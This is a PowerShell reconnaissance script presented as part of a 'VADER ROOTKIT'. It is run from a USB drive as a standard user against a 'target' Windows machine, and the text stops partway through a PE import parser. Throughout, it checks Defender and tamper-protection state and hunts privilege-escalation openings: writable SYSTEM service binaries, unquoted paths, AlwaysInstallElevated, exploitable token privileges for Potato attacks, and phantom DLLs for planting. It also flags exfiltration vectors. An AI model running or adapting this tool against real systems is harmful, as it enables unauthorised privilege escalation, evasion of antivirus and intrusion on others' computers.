# vader_recon.ps1 -- Full Target Reconnaissance
# VADER ROOTKIT -- 22DIV / george wu
#
# Self-contained recon package. Run from USB or local copy.
# Outputs organised log to same directory as script.
# Runs as STANDARD USER -- no elevation needed.
#
# Usage:
#   powershell -ExecutionPolicy Bypass -File vader_recon.ps1
#   powershell -ep bypass .\vader_recon.ps1

$ErrorActionPreference = "SilentlyContinue"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$hostname = $env:COMPUTERNAME
$ts = Get-Date -Format "yyyyMMdd_HHmmss"
$outFile = Join-Path $scriptDir "RECON_${hostname}_${ts}.log"

function W($text) {
    Write-Host $text
    $text | Out-File $outFile -Append -Encoding utf8
}

function WH($text) {
    Write-Host $text -ForegroundColor Cyan
    $text | Out-File $outFile -Append -Encoding utf8
}

function WF($sev, $cat, $detail) {
    $line = "  [$sev] $cat -- $detail"
    $color = switch ($sev) { "CRITICAL" { "Red" } "HIGH" { "Yellow" } "MEDIUM" { "Cyan" } default { "White" } }
    Write-Host $line -ForegroundColor $color
    $line | Out-File $outFile -Append -Encoding utf8
}

function Test-Writable {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return $false }
    try {
        $acl = Get-Acl $Path
        foreach ($ace in $acl.Access) {
            $sid = $null
            try { $sid = (New-Object System.Security.Principal.NTAccount($ace.IdentityReference)).Translate([System.Security.Principal.SecurityIdentifier]) } catch { continue }
            $wrSids = @("S-1-5-32-545","S-1-1-0","S-1-5-11","S-1-5-4")
            $iw = ($wrSids -contains $sid.Value)
            if ($iw -and ($ace.AccessControlType -eq "Allow") -and
                (($ace.FileSystemRights -band 0x116) -or ($ace.FileSystemRights -band 0x40000000))) {
                return $true
            }
        }
    } catch {}
    return $false
}

# ═══════════════════════════════════════════════════════════════
# HEADER
# ═══════════════════════════════════════════════════════════════

"" | Out-File $outFile -Encoding utf8
WH "================================================================"
WH "  VADER RECON -- 22DIV / george wu"
WH "  Target: $hostname"
WH "  Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
WH "  User: $env:USERNAME"
WH "  Script: $($MyInvocation.MyCommand.Path)"
WH "================================================================"
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 1: SYSTEM IDENTITY
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 1: SYSTEM IDENTITY ==="
W ""

$os = Get-WmiObject Win32_OperatingSystem
$cs = Get-WmiObject Win32_ComputerSystem
$cpu = Get-WmiObject Win32_Processor | Select-Object -First 1
$bios = Get-WmiObject Win32_BIOS

W "  Hostname:      $hostname"
W "  OS:            $($os.Caption) $($os.Version)"
W "  Build:         $($os.BuildNumber)"
W "  Architecture:  $($os.OSArchitecture)"
W "  Domain:        $($cs.Domain)"
W "  Manufacturer:  $($cs.Manufacturer)"
W "  Model:         $($cs.Model)"
W "  CPU:           $($cpu.Name)"
W "  RAM:           $([math]::Round($cs.TotalPhysicalMemory / 1GB, 1)) GB"
W "  BIOS:          $($bios.SMBIOSBIOSVersion)"
W "  Install Date:  $($os.ConvertToDateTime($os.InstallDate))"
W "  Last Boot:     $($os.ConvertToDateTime($os.LastBootUpTime))"
W ""

# Hotfixes
W "  Installed Hotfixes:"
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 | ForEach-Object {
    W "    $($_.HotFixID)  $($_.InstalledOn)  $($_.Description)"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 2: USER & PRIVILEGE CONTEXT
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 2: USER & PRIVILEGE CONTEXT ==="
W ""

$id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
W "  Username:      $($id.Name)"
W "  SID:           $($id.User.Value)"
W "  Auth Type:     $($id.AuthenticationType)"
$isAdmin = ([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
W "  Is Admin:      $isAdmin"
W ""

# Groups
W "  Group Memberships:"
$id.Groups | ForEach-Object {
    try {
        $name = $_.Translate([System.Security.Principal.NTAccount]).Value
        W "    $name ($($_.Value))"
    } catch {
        W "    $($_.Value) (unresolvable)"
    }
}
W ""

# Privileges
W "  Token Privileges:"
$privOut = whoami /priv 2>$null
if ($privOut) {
    $privOut | ForEach-Object { W "    $_" }
}
W ""

# All local users
W "  Local User Accounts:"
Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True" | ForEach-Object {
    $admin = ""
    try {
        $members = net localgroup Administrators 2>$null
        if ($members -match [regex]::Escape($_.Name)) { $admin = " [ADMIN]" }
    } catch {}
    W "    $($_.Name)  SID:$($_.SID)  Disabled:$($_.Disabled)$admin"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 3: UAC & SECURITY CONFIGURATION
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 3: UAC & SECURITY CONFIG ==="
W ""

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacKeys = @("ConsentPromptBehaviorAdmin","ConsentPromptBehaviorUser","EnableLUA",
             "PromptOnSecureDesktop","EnableVirtualization","FilterAdministratorToken")
foreach ($k in $uacKeys) {
    $v = (Get-ItemProperty $uacPath -Name $k -ErrorAction SilentlyContinue).$k
    W "  $k = $v"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 4: DEFENDER / AV STATUS
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 4: DEFENDER / AV STATUS ==="
W ""

try {
    $mpPref = Get-MpPreference
    $mpStatus = Get-MpComputerStatus

    W "  AMRunningMode:           $($mpStatus.AMRunningMode)"
    W "  RealTimeProtection:      $($mpStatus.RealTimeProtectionEnabled)"
    W "  BehaviorMonitor:         $($mpStatus.BehaviorMonitorEnabled)"
    W "  IoavProtection:          $($mpStatus.IoavProtectionEnabled)"
    W "  OnAccessProtection:      $($mpStatus.OnAccessProtectionEnabled)"
    W "  AntivirusEnabled:        $($mpStatus.AntivirusEnabled)"
    W "  AntispywareEnabled:      $($mpStatus.AntispywareEnabled)"
    W "  IsTamperProtected:       $($mpStatus.IsTamperProtected)"
    W "  NISEnabled:              $($mpStatus.NISEnabled)"
    W "  AMServiceEnabled:        $($mpStatus.AMServiceEnabled)"
    W "  AMProductVersion:        $($mpStatus.AMProductVersion)"
    W "  AMEngineVersion:         $($mpStatus.AMEngineVersion)"
    W "  AntispywareSignatureAge: $($mpStatus.AntispywareSignatureAge) days"
    W ""

    if (-not $mpStatus.IsTamperProtected) {
        WF "CRITICAL" "TAMPER_PROTECT_OFF" "Tamper Protection disabled -- Defender can be stopped programmatically post-SYSTEM"
    }
    if ($mpStatus.RealTimeProtectionEnabled) {
        WF "MEDIUM" "RTP_ACTIVE" "RealTime Protection active -- binaries scanned on write, TOCTOU race requires this"
    }
} catch {
    W "  [!] Cannot query Defender (Get-MpPreference failed)"
    W "      May need admin, or Defender not installed"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 5: VIRTUALIZATION-BASED SECURITY (VBS)
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 5: VBS / HVCI / SECURE BOOT ==="
W ""

$vbsOut = systeminfo 2>$null | Select-String -Pattern "Hyper-V|Virtualization|Device Guard|Credential Guard|Secure Boot|HVCI"
if ($vbsOut) {
    $vbsOut | ForEach-Object { W "  $_" }
} else {
    W "  [*] No VBS/HVCI information in systeminfo output"
}
W ""

$dgKey = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard"
$dgProps = @("EnableVirtualizationBasedSecurity","RequirePlatformSecurityFeatures","Locked")
foreach ($p in $dgProps) {
    $v = (Get-ItemProperty $dgKey -Name $p -ErrorAction SilentlyContinue).$p
    if ($v -ne $null) { W "  DeviceGuard\$p = $v" }
}

$hvciKey = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"
$hvci = (Get-ItemProperty $hvciKey -Name "Enabled" -ErrorAction SilentlyContinue).Enabled
if ($hvci -ne $null) { W "  HVCI Enabled = $hvci" }

$sbKey = "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State"
$sb = (Get-ItemProperty $sbKey -Name "UEFISecureBootEnabled" -ErrorAction SilentlyContinue).UEFISecureBootEnabled
if ($sb -ne $null) { W "  SecureBoot = $sb" }
W ""

if ($hvci -eq 1) {
    WF "HIGH" "HVCI_ACTIVE" "HVCI running -- unsigned kernel drivers blocked, user-mode payloads still viable"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 6: NETWORK STATE
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 6: NETWORK STATE ==="
W ""

# IP config
W "  --- Adapters ---"
Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | ForEach-Object {
    $iface = Get-NetAdapter -InterfaceIndex $_.InterfaceIndex -ErrorAction SilentlyContinue
    W "  $($iface.Name): $($_.IPAddress)/$($_.PrefixLength) ($($iface.Status))"
}
W ""

# Default gateway
$gw = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -First 1).NextHop
W "  Default Gateway: $gw"

# DNS
$dns = (Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object { $_.ServerAddresses }).ServerAddresses | Select-Object -Unique
W "  DNS Servers: $($dns -join ', ')"
W ""

# Open ports
W "  --- Listening Ports ---"
$listeners = netstat -ano 2>$null | Select-String "LISTENING"
$listeners | ForEach-Object {
    $line = $_.ToString().Trim()
    if ($line -match '(\S+)\s+(\S+)\s+(\S+)\s+LISTENING\s+(\d+)') {
        $proto = $Matches[1]
        $local = $Matches[2]
        $pid = $Matches[4]
        $proc = (Get-Process -Id $pid -ErrorAction SilentlyContinue).ProcessName
        W "  $local  PID:$pid  $proc"
    }
}
W ""

# Firewall profiles
W "  --- Firewall Profiles ---"
$fwProfiles = netsh advfirewall show allprofiles state 2>$null
$fwProfiles | ForEach-Object { if ($_.Trim()) { W "  $_" } }
W ""

# ARP table
W "  --- ARP Table ---"
arp -a 2>$null | ForEach-Object { if ($_.Trim()) { W "  $_" } }
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 7: SYSTEM SERVICES — PRIVILEGE ESCALATION HUNT
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 7: SYSTEM SERVICES -- PRIVESC HUNT ==="
W ""

$services = Get-WmiObject Win32_Service | Where-Object {
    $_.StartName -eq "LocalSystem" -or
    $_.StartName -match "SYSTEM" -or
    $_.StartName -eq "NT AUTHORITY\LocalService" -or
    $_.StartName -eq "NT AUTHORITY\NetworkService"
}

W "  Total privileged services: $($services.Count)"
W ""

$writableSvcs = @()
foreach ($svc in $services) {
    $binPath = $svc.PathName
    if (-not $binPath) { continue }

    if ($binPath.StartsWith('"')) { $exePath = ($binPath -split '"')[1] }
    else { $exePath = ($binPath -split ' ')[0] }

    if (-not (Test-Path $exePath)) { continue }

    $exeDir = Split-Path $exePath -Parent

    # Check exe itself
    $exeWritable = Test-Writable $exePath
    $dirWritable = Test-Writable $exeDir

    if ($exeWritable -or $dirWritable) {
        $writableSvcs += [PSCustomObject]@{
            Name = $svc.Name
            Display = $svc.DisplayName
            Account = $svc.StartName
            Start = $svc.StartMode
            State = $svc.State
            ExePath = $exePath
            ExeDir = $exeDir
            ExeWritable = $exeWritable
            DirWritable = $dirWritable
        }

        $detail = "Service '$($svc.Name)' ($($svc.StartName))"
        if ($exeWritable) { $detail += " EXE WRITABLE: $exePath" }
        if ($dirWritable) { $detail += " DIR WRITABLE: $exeDir" }
        WF "CRITICAL" "SVC_WRITABLE" $detail
    }
}

if ($writableSvcs.Count -eq 0) {
    W "  [*] No writable SYSTEM service binaries or directories found"
}
W ""

# Services in user profile directories (always suspicious)
W "  --- Services in User Profiles ---"
$profileSvcs = $services | Where-Object { $_.PathName -match "\\Users\\" }
foreach ($svc in $profileSvcs) {
    $binPath = $svc.PathName
    if ($binPath.StartsWith('"')) { $exePath = ($binPath -split '"')[1] }
    else { $exePath = ($binPath -split ' ')[0] }
    WF "HIGH" "SVC_IN_PROFILE" "Service '$($svc.Name)' ($($svc.StartName)) binary in user profile: $exePath"
}
W ""

# Unquoted service paths
W "  --- Unquoted Service Paths ---"
$unquoted = 0
foreach ($svc in $services) {
    $bp = $svc.PathName
    if (-not $bp) { continue }
    if ($bp -like '"*') { continue }
    if ($bp -match '^([A-Za-z]:\\[^ ]*\.exe)') { continue }
    if ($bp -match '\\svchost\.exe\b') { continue }
    if ($bp -match ' ') {
        $exePath = ($bp -split '\.exe')[0] + ".exe"
        if ($exePath -match ' ') {
            $unquoted++
            WF "HIGH" "UNQUOTED_PATH" "Service '$($svc.Name)': $bp"
        }
    }
}
if ($unquoted -eq 0) { W "  [*] No unquoted service paths found" }
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 8: SERVICE BINARY ACLs (DETAILED)
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 8: SERVICE BINARY ACLs ==="
W ""

foreach ($ws in $writableSvcs) {
    W "  Service: $($ws.Name) ($($ws.Display))"
    W "  Account: $($ws.Account) | Start: $($ws.Start) | State: $($ws.State)"
    W "  Binary:  $($ws.ExePath)"
    W ""
    $aclOut = icacls $ws.ExePath 2>$null
    if ($aclOut) { $aclOut | ForEach-Object { W "  $_" } }
    W ""
    W "  Directory: $($ws.ExeDir)"
    $aclOut2 = icacls $ws.ExeDir 2>$null
    if ($aclOut2) { $aclOut2 | ForEach-Object { W "  $_" } }
    W "  -------"
    W ""
}

# ═══════════════════════════════════════════════════════════════
# SECTION 9: SCHEDULED TASKS AS SYSTEM
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 9: SCHEDULED TASKS (SYSTEM/HIGHEST) ==="
W ""

$taskHits = 0
try {
    $tasks = Get-ScheduledTask | Where-Object {
        $_.Principal.UserId -match "SYSTEM|S-1-5-18" -or
        $_.Principal.RunLevel -eq "Highest"
    }

    foreach ($task in $tasks) {
        foreach ($action in $task.Actions) {
            if ($action.Execute) {
                $taskExe = [Environment]::ExpandEnvironmentVariables($action.Execute)
                $taskDir = Split-Path $taskExe -Parent -ErrorAction SilentlyContinue
                if ($taskDir -and (Test-Writable $taskDir)) {
                    $taskHits++
                    WF "CRITICAL" "TASK_WRITABLE" "Task '$($task.TaskName)' ($($task.Principal.UserId)) writable dir: $taskDir"
                }
            }
        }
    }
    W "  SYSTEM/Highest tasks checked: $($tasks.Count), writable: $taskHits"
} catch {
    W "  [!] Could not enumerate scheduled tasks"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 10: PATH VARIABLE ANALYSIS
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 10: PATH VARIABLE ==="
W ""

$sysPath = [Environment]::GetEnvironmentVariable("Path","Machine") -split ";"
$usrPath = [Environment]::GetEnvironmentVariable("Path","User") -split ";"

W "  --- SYSTEM PATH ---"
foreach ($d in $sysPath) {
    if (-not $d.Trim()) { continue }
    $wr = Test-Writable $d.Trim()
    $marker = if ($wr) { " [WRITABLE]" } else { "" }
    W "  $($d.Trim())$marker"
    if ($wr) { WF "HIGH" "PATH_WRITABLE" "SYSTEM PATH writable: $($d.Trim())" }
}
W ""
W "  --- USER PATH ---"
foreach ($d in $usrPath) {
    if (-not $d.Trim()) { continue }
    $wr = Test-Writable $d.Trim()
    $marker = if ($wr) { " [WRITABLE]" } else { "" }
    W "  $($d.Trim())$marker"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 11: KnownDLLs
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 11: KnownDLLs ==="
W ""

$kd = @()
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
$rp = Get-ItemProperty $regPath
foreach ($prop in $rp.PSObject.Properties) {
    if ($prop.Name -notlike "PS*" -and $prop.Name -ne "DllDirectory" -and $prop.Name -ne "DllDirectory32") {
        $kd += $prop.Value
    }
}
W "  Count: $($kd.Count)"
W "  $($kd -join ', ')"
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 12: INSTALLED SOFTWARE
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 12: INSTALLED SOFTWARE ==="
W ""

$sw = @()
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
foreach ($rp in $regPaths) {
    Get-ItemProperty $rp -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | ForEach-Object {
        $sw += [PSCustomObject]@{
            Name = $_.DisplayName
            Version = $_.DisplayVersion
            Publisher = $_.Publisher
            InstallLocation = $_.InstallLocation
        }
    }
}

$sw | Sort-Object Name -Unique | ForEach-Object {
    $loc = if ($_.InstallLocation) { " [$($_.InstallLocation)]" } else { "" }
    W "  $($_.Name) v$($_.Version) ($($_.Publisher))$loc"
}
W ""
W "  Total: $($sw.Count) programs"
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 13: RUNNING PROCESSES
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 13: RUNNING PROCESSES ==="
W ""

Get-Process | Sort-Object -Property WorkingSet64 -Descending | Select-Object -First 40 | ForEach-Object {
    $mem = [math]::Round($_.WorkingSet64 / 1MB, 1)
    $path = $_.Path
    if (-not $path) { $path = "(no path)" }
    W "  PID:$($_.Id.ToString().PadLeft(6))  $($_.ProcessName.PadRight(30))  ${mem}MB  $path"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 14: AUTORUN / PERSISTENCE LOCATIONS
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 14: AUTORUN / PERSISTENCE ==="
W ""

$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($rk in $runKeys) {
    W "  $rk"
    $props = Get-ItemProperty $rk -ErrorAction SilentlyContinue
    if ($props) {
        $props.PSObject.Properties | Where-Object { $_.Name -notlike "PS*" } | ForEach-Object {
            W "    $($_.Name) = $($_.Value)"
        }
    } else {
        W "    (empty)"
    }
    W ""
}

# Startup folder
$startupPath = [Environment]::GetFolderPath("Startup")
W "  Startup Folder: $startupPath"
Get-ChildItem $startupPath -ErrorAction SilentlyContinue | ForEach-Object {
    W "    $($_.Name)"
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 15: WRITABLE PROGRAMDATA
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 15: WRITABLE PROGRAMDATA ==="
W ""

$pdCount = 0
Get-ChildItem "C:\ProgramData" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    if (Test-Writable $_.FullName) {
        $pdCount++
        W "  [W] $($_.FullName)"
        Get-ChildItem $_.FullName -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            if (Test-Writable $_.FullName) { W "    [W] $($_.FullName)" }
        }
    }
}
W "  Total writable: $pdCount"
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 16: INTERESTING FILES & DIRS
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 16: INTERESTING FILES ==="
W ""

$checkPaths = @(
    "C:\Windows\Temp",
    "C:\Users\Public",
    "C:\ProgramData",
    "$env:TEMP"
)
foreach ($cp in $checkPaths) {
    $wr = Test-Writable $cp
    W "  $cp -- Writable: $wr"
}
W ""

# Check for common remote access tools
W "  --- Remote Access Tools ---"
$ratProcs = @("TeamViewer","AnyDesk","tv_w32","tv_x64","LogMeIn","VNC","RustDesk")
foreach ($r in $ratProcs) {
    $found = Get-Process -Name "*$r*" -ErrorAction SilentlyContinue
    if ($found) {
        WF "HIGH" "RAT_RUNNING" "$r running (PID: $($found.Id -join ','))"
    }
}

# Check TeamViewer registry
$tvReg = Get-ItemProperty "HKLM:\SOFTWARE\TeamViewer" -ErrorAction SilentlyContinue
if ($tvReg) {
    W "  TeamViewer registry found:"
    $tvReg.PSObject.Properties | Where-Object { $_.Name -notlike "PS*" } | ForEach-Object {
        W "    $($_.Name) = $($_.Value)"
    }
}

# Dropbox
$dbProc = Get-Process -Name "Dropbox" -ErrorAction SilentlyContinue
if ($dbProc) { WF "MEDIUM" "DROPBOX" "Dropbox running -- potential exfil vector via sync folder" }
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 17: SHARES & REMOTE ACCESS CONFIG
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 17: SHARES & REMOTE ACCESS ==="
W ""

W "  --- Network Shares ---"
net share 2>$null | ForEach-Object { W "  $_" }
W ""

W "  --- RDP Status ---"
$rdp = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction SilentlyContinue).fDenyTSConnections
W "  RDP Denied: $rdp (0=enabled, 1=disabled)"

$winrm = Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN"
W "  WinRM Key Exists: $winrm"
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 18: PRIVILEGE ESCALATION QUICK CHECKS
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 18: PRIVESC QUICK CHECKS ==="
W ""

# AlwaysInstallElevated (MSI installer → SYSTEM)
$aieHKLM = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aieHKCU = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aieHKLMStr = if ($aieHKLM -ne $null) { $aieHKLM } else { "NOT SET (secure)" }
$aieHKCUStr = if ($aieHKCU -ne $null) { $aieHKCU } else { "NOT SET (secure)" }
W "  AlwaysInstallElevated (HKLM): $aieHKLMStr"
W "  AlwaysInstallElevated (HKCU): $aieHKCUStr"
if ($aieHKLM -eq 1 -and $aieHKCU -eq 1) {
    WF "CRITICAL" "ALWAYS_INSTALL_ELEVATED" "Both HKLM+HKCU set -- any user can install MSI as SYSTEM (msiexec /i payload.msi)"
}
W ""

# AppInit_DLLs
$appInitKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
$loadAppInit = (Get-ItemProperty $appInitKey -Name "LoadAppInit_DLLs" -ErrorAction SilentlyContinue).LoadAppInit_DLLs
$appInitDlls = (Get-ItemProperty $appInitKey -Name "AppInit_DLLs" -ErrorAction SilentlyContinue).AppInit_DLLs
W "  LoadAppInit_DLLs: $loadAppInit (0=disabled, 1=enabled)"
W "  AppInit_DLLs: $(if ($appInitDlls) { $appInitDlls } else { '(empty)' })"
if ($loadAppInit -eq 1 -and $appInitDlls) {
    WF "HIGH" "APPINIT_ACTIVE" "AppInit_DLLs enabled with value: $appInitDlls -- injected into every user32.dll-loading process"
}
W ""

# Image File Execution Options (IFEO) debugger entries
W "  --- IFEO Debugger Entries ---"
$ifeoCount = 0
$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
Get-ChildItem $ifeoPath -ErrorAction SilentlyContinue | ForEach-Object {
    $dbg = (Get-ItemProperty $_.PSPath -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
    if ($dbg) {
        $ifeoCount++
        $name = Split-Path $_.PSPath -Leaf
        WF "HIGH" "IFEO_DEBUGGER" "IFEO on '$name': $dbg"
    }
}
if ($ifeoCount -eq 0) { W "  [*] No IFEO debugger entries (clean)" }
W ""

# Print Monitor DLLs
W "  --- Print Monitor DLLs ---"
$monPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors"
Get-ChildItem $monPath -ErrorAction SilentlyContinue | ForEach-Object {
    $driver = (Get-ItemProperty $_.PSPath -Name "Driver" -ErrorAction SilentlyContinue).Driver
    if ($driver) {
        $name = Split-Path $_.PSPath -Leaf
        $fullPath = Join-Path "C:\Windows\System32" $driver
        $exists = Test-Path $fullPath
        $inSys32 = if ($exists) { "IN System32" } else { "MISSING" }
        W "  Monitor: $name  Driver: $driver  ($inSys32)"
        if (-not $exists) {
            WF "HIGH" "PRINT_MONITOR_MISSING" "Print monitor '$name' driver '$driver' not in System32 -- plantable"
        }
    }
}
W ""

# LSA Authentication Packages
W "  --- LSA Auth Packages ---"
$lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$authPkgs = (Get-ItemProperty $lsaKey -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"
$secPkgs = (Get-ItemProperty $lsaKey -Name "Security Packages" -ErrorAction SilentlyContinue)."Security Packages"
W "  Auth Packages: $($authPkgs -join ', ')"
W "  Security Packages: $($secPkgs -join ', ')"
$knownAuth = @("msv1_0","")
$suspAuth = $authPkgs | Where-Object { $_ -and $knownAuth -notcontains $_ -and $_ -ne "SshdPinAuthLsa" }
if ($suspAuth) {
    foreach ($sa in $suspAuth) {
        WF "HIGH" "LSA_UNKNOWN_PKG" "Non-default LSA auth package: $sa"
    }
}
W ""

# WMI Permanent Event Subscriptions (persistence)
W "  --- WMI Event Subscriptions ---"
$wmiConsumers = @()
try {
    $wmiConsumers = Get-WmiObject -Namespace "root\subscription" -Class "__EventConsumer" -ErrorAction Stop
    foreach ($c in $wmiConsumers) {
        $ctype = $c.__CLASS
        $cname = $c.Name
        if ($ctype -eq "CommandLineEventConsumer") {
            WF "HIGH" "WMI_CMDLINE_CONSUMER" "WMI CommandLine consumer: $cname -- Cmd: $($c.CommandLineTemplate)"
        } elseif ($ctype -eq "ActiveScriptEventConsumer") {
            WF "HIGH" "WMI_SCRIPT_CONSUMER" "WMI ActiveScript consumer: $cname"
        } else {
            W "  ${ctype}: ${cname}"
        }
    }
    if ($wmiConsumers.Count -eq 0) { W "  [*] No WMI event consumers (clean)" }
} catch {
    W "  [*] Could not enumerate WMI subscriptions"
}
W ""

# Token Privileges (detailed)
W "  --- Token Privileges (Exploitable) ---"
$privList = whoami /priv 2>$null
$dangerousPrivs = @("SeImpersonatePrivilege","SeAssignPrimaryTokenPrivilege",
    "SeDebugPrivilege","SeTcbPrivilege","SeLoadDriverPrivilege",
    "SeRestorePrivilege","SeBackupPrivilege","SeTakeOwnershipPrivilege")
foreach ($dp in $dangerousPrivs) {
    $found = $privList | Where-Object { $_ -match $dp }
    if ($found) {
        WF "CRITICAL" "DANGEROUS_PRIV" "Token has $dp -- privilege escalation possible"
    }
}
$hasImpersonate = $privList | Where-Object { $_ -match "SeImpersonatePrivilege" }
if ($hasImpersonate) {
    W "  [!] SeImpersonate present -- Potato attacks viable (JuicyPotato, PrintSpoofer, GodPotato)"
}
if (-not $hasImpersonate) {
    W "  [*] No dangerous privileges (standard user token)"
}
W ""

# Named Pipes (SYSTEM-owned)
W "  --- Named Pipes (sample) ---"
$pipes = [System.IO.Directory]::GetFiles("\\.\pipe\") 2>$null
$pipeCount = if ($pipes) { $pipes.Count } else { 0 }
W "  Total named pipes: $pipeCount"
$nonWinPipes = $pipes | Where-Object {
    $name = Split-Path $_ -Leaf
    $name -notmatch "^(mojo|chrome|crashpad|PIPE_|msys|cygwin|docker|wsl)" -and
    $name -notmatch "^(Win32|atsvc|browser|epmapper|eventlog|lsass|ntsvcs|spoolss|srvsvc|wkssvc)"
} | Select-Object -First 10
if ($nonWinPipes) {
    W "  Non-standard pipes (sample):"
    foreach ($p in $nonWinPipes) { W "    $(Split-Path $p -Leaf)" }
}
W ""

# ═══════════════════════════════════════════════════════════════
# SECTION 19: PHANTOM DLL HUNTING (PE Import Analysis)
# ═══════════════════════════════════════════════════════════════

WH "=== SECTION 19: PHANTOM DLL HUNTING ==="
W ""
W "  Scanning SYSTEM service PE imports for phantom DLLs..."
W "  (DLLs in import table that don't exist on disk = plantable)"
W ""

# Pure PowerShell PE import parser — no external tools needed
function Get-PEImports {
    param([string]$FilePath, [switch]$IncludeDelayLoad)
    $result = @{ Normal = @(); DelayLoad = @() }
    try {
        $stream = [System.IO.File]::OpenRead($FilePath)
        $reader = New-Object System.IO.BinaryReader($stream)

        # DOS header
        $dosMagic = $reader.ReadUInt16()
        if ($dosMagic -ne 0x5A4D) { $stream.Close(); return $result }

        $stream.Position = 0x3C
        $peOffset = $reader.ReadInt32()

        # PE signature
        $stream.Position = $peOffset
        $peSig = $reader.ReadUInt32()
        if ($peSig -ne 0x00004550) { $stream.Close(); return $result }

        # COFF header
        $reader.ReadUInt16() | Out-Null  # Machine
        $numSections = $reader.ReadUInt16()
        $reader.ReadBytes(12) | Out-Null  # TimeDateStamp, PointerToSymbolTable, NumberOfSymbols
        $optHeaderSize = $reader.ReadUInt16()
        $reader.ReadUInt16() | Out-Null  # Characteristics

        # Optional header
        $optStart = $stream.Position
        $magic = $reader.ReadUInt16()

        # Data directory offsets relative to optional header start
        if ($magic -eq 0x20B) {     # PE32+ (64-bit)
            $importDirOffset = 120  # Index 1 * 8 + 112
            $delayDirOffset = 216   # Index 13 * 8 + 112
        } elseif ($magic -eq 0x10B) { # PE32 (32-bit)
            $importDirOffset = 104  # Index 1 * 8 + 96
            $delayDirOffset = 200   # Index 13 * 8 + 96
        } else {
            $stream.Close(); return $result
        }

        # Read Import Directory RVA
        $stream.Position = $optStart + $importDirOffset
        $importRVA = $reader.ReadUInt32()
        $importSize = $reader.ReadUInt32()

        # Read Delay Import Directory RVA
        $delayRVA = 0
